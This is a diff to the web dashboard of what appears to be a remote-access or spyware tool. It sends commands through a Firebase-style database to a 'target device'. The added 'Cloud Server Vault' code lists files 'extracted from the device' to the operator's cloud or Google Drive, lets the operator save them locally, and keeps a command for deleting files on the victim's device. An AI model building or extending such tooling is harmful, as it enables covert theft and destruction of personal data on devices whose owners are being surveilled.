@@ -752,7 +752,7 @@
                     </div>
 
                     <!-- Files Table -->
-                    <div class="table-responsive" style="max-height: 520px; overflow-y: auto;">
+                    <div class="table-responsive" style="max-height: 420px; overflow-y: auto;">
                         <table class="data-table">
                             <thead>
                                 <tr>
@@ -771,6 +771,33 @@
                                 </tr>
                             </tbody>
                         </table>
+                    </div>
+
+                    <!-- Section: Cloud Server Vault (Downloaded Files Gallery & Table) -->
+                    <div style="margin-top: 24px; padding-top: 20px; border-top: 1px solid var(--border);">
+                        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 14px; flex-wrap: wrap; gap: 10px;">
+                            <div>
+                                <h5 style="font-size: 0.98rem; font-weight: 700; color: #fff; display: flex; align-items: center; gap: 8px; margin: 0 0 2px 0;">
+                                    <i class="fas fa-cloud-download-alt text-primary-c"></i> Cloud Server Vault — Downloaded Files (<span id="cloudDownloadsCount">0</span>)
+                                </h5>
+                                <p style="font-size: 0.74rem; color: var(--text-secondary); margin: 0;">
+                                    Files extracted from the device to Cloud. Click <b>"💾 Save to PC/Phone"</b> to download locally.
+                                </p>
+                            </div>
+                            <div style="display: flex; gap: 8px;">
+                                <button onclick="clearAllCloudDownloads()" class="btn-danger-ghost" style="padding: 4px 12px; font-size: 0.72rem; border-radius: var(--radius-pill);">
+                                    <i class="fas fa-trash-alt me-1"></i> Clear Vault History
+                                </button>
+                            </div>
+                        </div>
+
+                        <!-- Cloud Downloads Table / Cards Container -->
+                        <div id="cloudDownloadsListContainer" style="display: flex; flex-direction: column; gap: 10px; max-height: 380px; overflow-y: auto;">
+                            <div class="empty-state" style="padding: 24px;">
+                                <i class="fas fa-cloud-upload-alt" style="font-size: 1.6rem; color: var(--text-muted); margin-bottom: 8px;"></i>
+                                <p>No files in Cloud Vault yet. Click the <b>"Cloud"</b> button next to any remote file above to upload and save it here.</p>
+                            </div>
+                        </div>
                     </div>
                 </div>
             </div>
@@ -2870,21 +2897,164 @@
         refreshCurrentFolder();
     }
 
+    // ------------------------------------------
+    // Cloud Server Vault & Downloads Manager
+    // ------------------------------------------
+    let allCloudDownloads = {};
+
     function downloadRemoteFile(path) {
         devRef.child('commands/downloadFile').set({
             path: path,
             timestamp: Date.now()
         });
-        alert('Download command sent! The file is being uploaded to your Cloud Server Vault...');
+        alert('☁️ File extraction started! The file is uploading from the device to your Cloud Server Vault below...');
     }
 
     function deleteRemoteFile(path) {
-        if (!confirm('Are you sure you want to delete this file on the target device?')) return;
+        if (!confirm('Are you sure you want to delete this file on the target device?\n' + path)) return;
         devRef.child('commands/deleteFile').set({
             path: path,
             timestamp: Date.now()
         });
     }
+
+    function saveCloudFileToLocal(key) {
+        const file = allCloudDownloads[key];
+        if (!file) {
+            alert('File information not found in Cloud Vault.');
+            return;
+        }
+
+        const fileName = file.name || 'downloaded_file';
+
+        // 1. If direct base64 data URI is present (instant direct download)
+        if (file.base64Data) {
+            try {
+                const a = document.createElement('a');
+                a.href = file.base64Data;
+                a.download = fileName;
+                document.body.appendChild(a);
+                a.click();
+                a.remove();
+                return;
+            } catch (e) {
+                console.error("Base64 save error:", e);
+            }
+        }
+
+        // 2. If direct Google Drive / Webhook download URL is present
+        const downloadUrl = file.directUrl || file.driveUrl;
+        if (downloadUrl) {
+            const a = document.createElement('a');
+            a.href = downloadUrl;
+            a.target = '_blank';
+            a.download = fileName;
+            document.body.appendChild(a);
+            a.click();
+            a.remove();
+            return;
+        }
+
+        alert(`File "${fileName}" uploaded to cloud, but no direct URL is attached yet. Check your Google Drive.`);
+    }
+
+    function deleteCloudDownload(key) {
+        if (!confirm('Remove this file entry from Cloud Vault?')) return;
+        devRef.child('files/downloads/' + key).remove();
+    }
+
+    function clearAllCloudDownloads() {
+        if (!confirm('Clear all downloaded file records from Cloud Server Vault?')) return;
+        devRef.child('files/downloads').remove();
+    }
+
+    function getFileIconByExtension(filename) {
+        const ext = (filename || '').split('.').pop().toLowerCase();
+        if (['jpg', 'jpeg', 'png', 'gif', 'webp', 'bmp', 'svg'].includes(ext)) {
+            return '<i class="fas fa-file-image" style="color: #ff375f;"></i>';
+        }
+        if (['mp4', 'mkv', 'avi', 'mov', '3gp'].includes(ext)) {
+            return '<i class="fas fa-file-video" style="color: #ff9f0a;"></i>';
+        }
+        if (['mp3', 'm4a', 'wav', 'aac', 'ogg', 'flac'].includes(ext)) {
+            return '<i class="fas fa-file-audio" style="color: #30d158;"></i>';
+        }
+        if (['pdf'].includes(ext)) {
+            return '<i class="fas fa-file-pdf" style="color: #ff453a;"></i>';
+        }
+        if (['zip', 'rar', '7z', 'tar', 'gz'].includes(ext)) {
+            return '<i class="fas fa-file-archive" style="color: #ffd60a;"></i>';
+        }
+        if (['apk'].includes(ext)) {
+            return '<i class="fab fa-android" style="color: #32d74b;"></i>';
+        }
+        if (['doc', 'docx', 'txt', 'rtf', 'log'].includes(ext)) {
+            return '<i class="fas fa-file-word" style="color: #0a84ff;"></i>';
+        }
+        if (['db', 'sqlite', 'db3', 'sql'].includes(ext)) {
+            return '<i class="fas fa-database" style="color: #bf5af2;"></i>';
+        }
+        return '<i class="fas fa-file-alt" style="color: var(--primary);"></i>';
+    }
+
+    devRef.child('files/downloads').on('value', snap => {
+        allCloudDownloads = snap.val() || {};
+        const container = document.getElementById('cloudDownloadsListContainer');
+        const countEl = document.getElementById('cloudDownloadsCount');
+        if (!container) return;
+
+        const keys = Object.keys(allCloudDownloads);
+        if (countEl) countEl.textContent = keys.length;
+
+        if (keys.length === 0) {
+            container.innerHTML = `
+                <div class="empty-state" style="padding: 24px;">
+                    <i class="fas fa-cloud-upload-alt" style="font-size: 1.6rem; color: var(--text-muted); margin-bottom: 8px;"></i>
+                    <p>No files in Cloud Vault yet. Click the <b>"Cloud"</b> button next to any remote file above to upload and save it here.</p>
+                </div>`;
+            return;
+        }
+
+        // Sort by newest time descending
+        keys.sort((a, b) => (allCloudDownloads[b].time || 0) - (allCloudDownloads[a].time || 0));
+
+        let html = '';
+        keys.forEach(k => {
+            const f = allCloudDownloads[k];
+            const name = f.name || 'Unknown File';
+            const path = f.path || '';
+            const sizeStr = f.size ? (f.size > 1048576 ? (f.size / 1048576).toFixed(2) + ' MB' : (f.size / 1024).toFixed(0) + ' KB') : '--';
+            const timeStr = f.time ? new Date(f.time).toLocaleString() : '--';
+            const icon = getFileIconByExtension(name);
+
+            html += `
+            <div style="display: flex; justify-content: space-between; align-items: center; background: rgba(255,255,255,0.03); border: 1px solid var(--border); border-radius: 12px; padding: 10px 14px; gap: 12px; flex-wrap: wrap;">
+                <div style="display: flex; align-items: center; gap: 12px; min-width: 220px; flex: 1;">
+                    <div style="font-size: 1.4rem; flex-shrink: 0; width: 38px; height: 38px; border-radius: 10px; background: rgba(255,255,255,0.05); display: flex; align-items: center; justify-content: center;">
+                        ${icon}
+                    </div>
+                    <div style="min-width: 0;">
+                        <div style="font-weight: 700; color: #fff; font-size: 0.85rem; word-break: break-all;">${escapeHtml(name)}</div>
+                        <div style="font-size: 0.7rem; color: var(--text-muted); font-family: monospace;">${escapeHtml(path)}</div>
+                        <div style="display: flex; align-items: center; gap: 8px; margin-top: 2px;">
+                            <span style="font-size: 0.68rem; color: var(--text-secondary);"><i class="fas fa-weight-hanging me-1"></i> ${sizeStr}</span>
+                            <span style="font-size: 0.68rem; color: var(--text-secondary);"><i class="far fa-clock me-1"></i> ${timeStr}</span>
+                            <span class="live-badge" style="font-size: 0.62rem; padding: 1px 6px; background: rgba(48,209,88,0.15); color: #30d158; border: 1px solid rgba(48,209,88,0.3);"><i class="fas fa-check-circle me-1"></i> Cloud Ready</span>
+                        </div>
+                    </div>
+                </div>
+                <div style="display: flex; gap: 8px; align-items: center;">
+                    <button onclick="saveCloudFileToLocal('${k}')" class="btn-primary-glow" style="padding: 6px 14px; font-size: 0.78rem; border-radius: var(--radius-pill); font-weight: 700;">
+                        <i class="fas fa-download me-1"></i> 💾 Save to PC/Phone
+                    </button>
+                    ${f.driveUrl ? `<a href="${escapeHtml(f.driveUrl)}" target="_blank" class="btn-ghost" style="padding: 6px 10px; font-size: 0.75rem; border-radius: var(--radius-pill);" title="Open Drive Link"><i class="fab fa-google-drive me-1"></i> Drive</a>` : ''}
+                    <button onclick="deleteCloudDownload('${k}')" class="btn-danger-ghost" style="padding: 6px 8px; font-size: 0.75rem; border-radius: var(--radius-pill);" title="Delete from Vault"><i class="fas fa-trash-alt"></i></button>
+                </div>
+            </div>`;
+        });
+
+        container.innerHTML = html;
+    });
 
     devRef.child('files').on('value', snap => {
         const data = snap.val();
